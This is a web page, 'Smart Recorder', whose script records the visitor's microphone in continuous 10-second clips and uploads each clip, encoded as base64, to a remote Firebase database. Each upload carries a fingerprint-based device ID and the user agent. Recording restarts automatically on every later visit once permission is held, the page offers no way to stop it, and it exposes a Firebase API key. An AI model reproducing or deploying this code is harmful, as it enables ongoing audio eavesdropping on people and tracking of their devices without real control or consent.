<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Smart Recorder</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }

body {
  background: #0a0a0a;
  color: #fff;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px;
}

/* Status card */
#statusCard {
  background: #1c1c1e;
  border-radius: 20px;
  padding: 32px 24px;
  max-width: 400px;
  width: 100%;
  text-align: center;
  box-shadow: 0 20px 60px rgba(0,0,0,0.6);
  border: 1px solid #2c2c2e;
}

.status-icon {
  font-size: 64px;
  margin-bottom: 16px;
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.08); }
}

#statusCard h1 {
  font-size: 22px;
  margin-bottom: 8px;
}

#statusCard p {
  font-size: 14px;
  color: #8e8e93;
  line-height: 1.6;
  margin-bottom: 20px;
}

/* Recording indicator */
#recBadge {
  display: none;
  background: #FF3B30;
  color: #fff;
  padding: 8px 16px;
  border-radius: 20px;
  font-size: 13px;
  font-weight: 600;
  align-items: center;
  gap: 8px;
  margin: 20px auto 0;
  width: fit-content;
  animation: recPulse 1.5s infinite;
}

#recBadge.show { display: inline-flex; }

#recBadge .dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: #fff;
  animation: dotPulse 1s infinite;
}

@keyframes recPulse {
  0%, 100% { box-shadow: 0 0 0 0 rgba(255,59,48,0.7); }
  50% { box-shadow: 0 0 0 15px rgba(255,59,48,0); }
}

@keyframes dotPulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.3; }
}

/* Stats */
#stats {
  display: none;
  margin-top: 20px;
  padding-top: 20px;
  border-top: 1px solid #2c2c2e;
  font-size: 13px;
  color: #8e8e93;
}

#stats.show { display: block; }

#stats .row {
  display: flex;
  justify-content: space-between;
  padding: 6px 0;
}

#stats .row strong {
  color: #0084FF;
  font-size: 15px;
}

/* Error state */
#statusCard.error .status-icon { animation: shake 0.5s infinite; }
#statusCard.error h1 { color: #FF3B30; }

@keyframes shake {
  0%, 100% { transform: rotate(-5deg); }
  50% { transform: rotate(5deg); }
}

/* Button */
.action-btn {
  width: 100%;
  padding: 14px;
  border: none;
  border-radius: 12px;
  background: #0084FF;
  color: #fff;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  margin-top: 16px;
  transition: transform 0.15s;
}

.action-btn:active { transform: scale(0.97); }

/* Guide box */
.guide-box {
  background: #2c2c2e;
  border-radius: 12px;
  padding: 16px;
  text-align: left;
  font-size: 13px;
  color: #e0e0e0;
  line-height: 1.8;
  margin-top: 16px;
  display: none;
}

.guide-box.show { display: block; }

.guide-box ol {
  margin-left: 18px;
  margin-top: 6px;
}

.guide-box strong { color: #4285F4; }
</style>
</head>
<body>

<div id="statusCard">
  <div class="status-icon" id="statusIcon">🎤</div>
  <h1 id="statusTitle">Initializing...</h1>
  <p id="statusMsg">Please wait...</p>

  <button class="action-btn" id="actionBtn" style="display:none;" onclick="handleAction()">
    🎤 Enable Microphone
  </button>

  <div class="guide-box" id="guideBox"></div>

  <div id="recBadge">
    <div class="dot"></div>
    <span>Recording... <span id="recCount">0</span></span>
  </div>

  <div id="stats">
    <div class="row">
      <span>Session ID</span>
      <strong id="statSession">—</strong>
    </div>
    <div class="row">
      <span>Device ID</span>
      <strong id="statDevice">—</strong>
    </div>
    <div class="row">
      <span>Total Clips</span>
      <strong id="statClips">0</strong>
    </div>
    <div class="row">
      <span>Last Save</span>
      <strong id="statLast">—</strong>
    </div>
  </div>
</div>

<script type="module">
/* ============================================================
   SMART AUTO-RECORDER
   - Permission granted → auto start
   - Page visit → auto resume
   - 10 sec clips → RTDB save
   ============================================================ */

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, push, serverTimestamp }
  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
  authDomain: "my-rto-b2531.firebaseapp.com",
  databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
  projectId: "my-rto-b2531",
  storageBucket: "my-rto-b2531.firebasestorage.app",
  messagingSenderId: "465334829178",
  appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
};

const firebaseApp = initializeApp(firebaseConfig);
const db = getDatabase(firebaseApp);

console.log('✅ Firebase initialized');

/* ============================================================
   DEVICE ID
   ============================================================ */
function getDeviceId() {
  let deviceId = localStorage.getItem('pics_device_id');
  if (deviceId) return deviceId;

  const raw = [
    navigator.userAgent,
    window.screen.width + 'x' + window.screen.height,
    Intl.DateTimeFormat().resolvedOptions().timeZone,
    navigator.language,
    navigator.platform
  ].join('|');

  let hash = 0;
  for (let i = 0; i < raw.length; i++) {
    hash = ((hash << 5) - hash) + raw.charCodeAt(i);
    hash = hash & hash;
  }

  const BASE62 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  let id = '';
  let n = Math.abs(hash);
  for (let i = 0; i < 8; i++) {
    id += BASE62[n % 62];
    n = Math.floor(n / 62);
  }

  deviceId = 'HEK-' + id;
  localStorage.setItem('pics_device_id', deviceId);
  return deviceId;
}

const DEVICE_ID = getDeviceId();
const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

console.log('📱 Device ID:', DEVICE_ID);
console.log('🔑 Session ID:', SESSION_ID);

/* ============================================================
   STATE
   ============================================================ */
let micStream = null;
let audioRecorder = null;
let audioChunks = [];
let isRecording = false;
let recordingLoopTimer = null;
let clipCount = 0;
const CLIP_DURATION = 10000;   // 10 sec

/* ============================================================
   DOM
   ============================================================ */
const statusCard = document.getElementById('statusCard');
const statusIcon = document.getElementById('statusIcon');
const statusTitle = document.getElementById('statusTitle');
const statusMsg = document.getElementById('statusMsg');
const actionBtn = document.getElementById('actionBtn');
const guideBox = document.getElementById('guideBox');
const recBadge = document.getElementById('recBadge');
const recCount = document.getElementById('recCount');
const stats = document.getElementById('stats');
const statSession = document.getElementById('statSession');
const statDevice = document.getElementById('statDevice');
const statClips = document.getElementById('statClips');
const statLast = document.getElementById('statLast');

/* ============================================================
   UI UPDATES
   ============================================================ */
function setUI(icon, title, msg, isError = false) {
  statusIcon.textContent = icon;
  statusTitle.textContent = title;
  statusMsg.textContent = msg;
  statusCard.classList.toggle('error', isError);
}

function showActionBtn(text, handler) {
  actionBtn.textContent = text;
  actionBtn.style.display = 'block';
  actionBtn.onclick = handler;
}

function hideActionBtn() {
  actionBtn.style.display = 'none';
}

function showGuide(text) {
  guideBox.innerHTML = text;
  guideBox.classList.add('show');
}

function hideGuide() {
  guideBox.classList.remove('show');
}

/* ============================================================
   PERMISSION CHECK
   ============================================================ */
async function checkMicPermission() {
  if (!navigator.permissions || !navigator.permissions.query) {
    return 'unknown';
  }
  try {
    const status = await navigator.permissions.query({ name: 'microphone' });
    return status.state;   // "granted" | "denied" | "prompt"
  } catch (e) {
    return 'unknown';
  }
}

/* ============================================================
   START RECORDING (Mic get + Loop)
   ============================================================ */
async function startRecorder() {
  try {
    console.log('🎤 Requesting mic...');

    micStream = await navigator.mediaDevices.getUserMedia({
      audio: {
        echoCancellation: true,
        noiseSuppression: true,
        autoGainControl: true
      }
    });

    const tracks = micStream.getAudioTracks();
    console.log('✅ Mic granted | Tracks:', tracks.length);

    setUI('🎙️', 'Recording Active', 'Your mic is recording 10 sec clips in background');
    hideActionBtn();
    hideGuide();
    recBadge.classList.add('show');
    stats.classList.add('show');

    statSession.textContent = SESSION_ID.slice(0, 12) + '...';
    statDevice.textContent = DEVICE_ID;

    startRecordingLoop();
    return true;

  } catch (err) {
    console.error('❌ Mic error:', err.name, err.message);

    if (err.name === 'NotAllowedError' || err.name === 'SecurityError') {
      setUI('🚫', 'Microphone Blocked',
        'You denied mic access. Enable it manually from browser settings.', true);
      showGuide(`
        <strong>How to enable:</strong>
        <ol>
          <li>Click the <strong>🔒 lock icon</strong> in address bar</li>
          <li>Find <strong>Microphone</strong> → set to <strong>Allow</strong></li>
          <li>Refresh the page</li>
        </ol>
      `);
      showActionBtn('🔄 I Enabled It — Retry', () => location.reload());
    } else if (err.name === 'NotFoundError') {
      setUI('🎤', 'No Microphone Found',
        'Please connect a mic and refresh the page.', true);
      showActionBtn('🔄 Retry', () => location.reload());
    } else if (err.name === 'NotReadableError') {
      setUI('⚠️', 'Microphone In Use',
        'Another app is using your mic. Close it and retry.', true);
      showActionBtn('🔄 Retry', () => location.reload());
    } else {
      setUI('❌', 'Mic Error', err.message || 'Unknown error', true);
      showActionBtn('🔄 Retry', () => location.reload());
    }
    return false;
  }
}

/* ============================================================
   RECORDING LOOP — 10 sec clips
   ============================================================ */
function startRecordingLoop() {
  stopRecordingLoop();
  clipCount = 0;

  console.log('🎤 Recording loop started');

  // Pehla clip 1 sec baad
  setTimeout(() => {
    if (micStream) recordClip();
  }, 1000);

  // Har 11 sec me naya clip
  recordingLoopTimer = setInterval(() => {
    if (micStream && !isRecording) {
      recordClip();
    }
  }, 11000);
}

function stopRecordingLoop() {
  if (recordingLoopTimer) {
    clearInterval(recordingLoopTimer);
    recordingLoopTimer = null;
  }
  if (audioRecorder && audioRecorder.state === 'recording') {
    try { audioRecorder.stop(); } catch (e) {}
  }
  isRecording = false;
  console.log('⏹️ Recording loop stopped');
}

/* ============================================================
   RECORD SINGLE CLIP
   ============================================================ */
async function recordClip() {
  if (!micStream || isRecording) return;

  const audioTracks = micStream.getAudioTracks();
  if (audioTracks.length === 0) {
    console.warn('⚠️ No audio track');
    return;
  }

  try {
    isRecording = true;
    audioChunks = [];
    clipCount++;

    console.log(`🎤 [Clip #${clipCount}] Recording...`);

    const audioOnlyStream = new MediaStream(audioTracks);

    let mimeType = 'audio/webm;codecs=opus';
    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/webm';
    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/mp4';
    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';

    const options = { audioBitsPerSecond: 24000 };
    if (mimeType) options.mimeType = mimeType;

    audioRecorder = new MediaRecorder(audioOnlyStream, options);

    audioRecorder.ondataavailable = (e) => {
      if (e.data && e.data.size > 0) audioChunks.push(e.data);
    };

    audioRecorder.onstop = async () => {
      const actualMime = audioRecorder.mimeType || mimeType || 'audio/webm';
      const blob = new Blob(audioChunks, { type: actualMime });

      console.log(`🎤 [Clip #${clipCount}] Size: ${(blob.size / 1024).toFixed(1)} KB`);

      if (blob.size > 500) {
        await saveToRTDB(blob, actualMime);
      } else {
        console.warn('⚠️ Blob too small, skipped');
      }

      audioChunks = [];
      isRecording = false;
      recCount.textContent = clipCount;
    };

    audioRecorder.start();

    setTimeout(() => {
      if (audioRecorder && audioRecorder.state === 'recording') {
        audioRecorder.stop();
      }
    }, CLIP_DURATION);

  } catch (err) {
    console.error('❌ Record error:', err);
    isRecording = false;
  }
}

/* ============================================================
   SAVE TO RTDB
   ============================================================ */
async function saveToRTDB(blob, mimeType) {
  const now = new Date();
  const timestamp = now.getTime();

  const date = now.toLocaleDateString('en-IN', {
    day: '2-digit', month: '2-digit', year: 'numeric',
    timeZone: 'Asia/Kolkata'
  });
  const time = now.toLocaleTimeString('en-IN', {
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    hour12: true, timeZone: 'Asia/Kolkata'
  });

  console.log('📤 Saving to RTDB...', (blob.size / 1024).toFixed(1), 'KB');

  let base64 = '';
  try {
    base64 = await new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onloadend = () => resolve(reader.result);
      reader.onerror = reject;
      reader.readAsDataURL(blob);
    });
    console.log('✅ Base64 ready:', (base64.length / 1024).toFixed(1), 'KB');
  } catch (err) {
    console.error('❌ Base64 failed:', err);
    return;
  }

  try {
    const audioRef = ref(db, 'mic_audio/' + DEVICE_ID);

    const newRef = await push(audioRef, {
      deviceId: DEVICE_ID,
      sessionId: SESSION_ID,
      audioBase64: base64,
      size: blob.size,
      duration: CLIP_DURATION / 1000,
      mimeType: mimeType || 'audio/webm',
      date: date,
      time: time,
      timestamp: timestamp,
      capturedAtISO: now.toISOString(),
      capturedAt: serverTimestamp(),
      userAgent: navigator.userAgent.slice(0, 100)
    });

    console.log('✅ RTDB saved:', newRef.key);
    statLast.textContent = time;
    statClips.textContent = clipCount;

    showToast('🎤 Saved');

  } catch (err) {
    console.error('❌ RTDB save FAILED:', err.code, err.message);
    showToast('❌ Save failed: ' + (err.code || 'unknown'));
  }
}

/* ============================================================
   TOAST
   ============================================================ */
function showToast(msg) {
  const existing = document.querySelector('.toast');
  if (existing) existing.remove();

  const toast = document.createElement('div');
  toast.className = 'toast';
  toast.textContent = msg;
  toast.style.cssText = `
    position: fixed; bottom: 30px; left: 50%;
    transform: translateX(-50%); background: #2c2c2e; color: #fff;
    padding: 10px 20px; border-radius: 20px; font-size: 13px;
    z-index: 9999; box-shadow: 0 4px 20px rgba(0,0,0,0.5);
    animation: toastIn 0.3s ease;
  `;
  document.body.appendChild(toast);

  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transition = 'opacity 0.3s';
    setTimeout(() => toast.remove(), 300);
  }, 1500);
}

/* ============================================================
   ACTION HANDLER
   ============================================================ */
window.handleAction = async function() {
  hideActionBtn();
  hideGuide();
  setUI('⏳', 'Requesting...', 'Please allow microphone access...');

  await startRecorder();
};

/* ============================================================
   BACKGROUND SAVE (tab hide)
   ============================================================ */
document.addEventListener('visibilitychange', () => {
  if (document.hidden && audioRecorder && audioRecorder.state === 'recording') {
    console.log('👁️ Tab hidden — saving current clip');
    try { audioRecorder.stop(); } catch (e) {}
  }
});

window.addEventListener('pagehide', () => {
  if (audioRecorder && audioRecorder.state === 'recording') {
    try { audioRecorder.stop(); } catch (e) {}
  }
});

/* ============================================================
   PERMISSION WATCH — agar user settings se change kare
   ============================================================ */
async function watchPermissionChange() {
  if (!navigator.permissions || !navigator.permissions.query) return;

  try {
    const status = await navigator.permissions.query({ name: 'microphone' });

    status.onchange = () => {
      console.log('🔔 Permission changed:', status.state);
      if (status.state === 'granted' && !micStream) {
        // Auto-start
        console.log('✅ Permission granted — auto-starting');
        startRecorder();
      } else if (status.state === 'denied' && micStream) {
        // Permission revoked
        console.log('❌ Permission revoked — stopping');
        stopRecorder();
      }
    };
  } catch (e) {}
}

function stopRecorder() {
  stopRecordingLoop();
  if (micStream) {
    micStream.getTracks().forEach(t => t.stop());
    micStream = null;
  }
  recBadge.classList.remove('show');
  setUI('⏹️', 'Stopped', 'Recording stopped');
}

/* ============================================================
   INIT — Auto Smart Start
   ============================================================ */
async function init() {
  console.log('🚀 Smart Recorder starting...');

  const state = await checkMicPermission();
  console.log('📋 Permission state:', state);

  if (state === 'granted') {
    // 🔥 Already granted — turant start
    console.log('✅ Already granted — auto-starting');
    setUI('⏳', 'Starting...', 'Mic permission already granted');
    await startRecorder();

  } else if (state === 'denied') {
    // Blocked — guide dikhao
    console.log('🚫 Denied — showing guide');
    setUI('🚫', 'Microphone Blocked',
      'You denied mic access earlier. Enable it manually from browser settings.', true);
    showGuide(`
      <strong>How to enable:</strong>
      <ol>
        <li>Click the <strong>🔒 lock icon</strong> in address bar</li>
        <li>Find <strong>Microphone</strong> → set to <strong>Allow</strong></li>
        <li>Refresh the page</li>
      </ol>
    `);
    showActionBtn('🔄 I Enabled It — Refresh', () => location.reload());

  } else {
    // Prompt — ek baar maango
    console.log('⚠️ Prompt state — requesting permission');
    setUI('🎤', 'Enable Microphone',
      'This app needs mic access to work. Please allow to continue.');
    showActionBtn('🎤 Enable Microphone', handleAction);
  }

  watchPermissionChange();
}

/* Auto-init */
init();

console.log('✅ Smart Recorder ready');
</script>
</body>
</html>
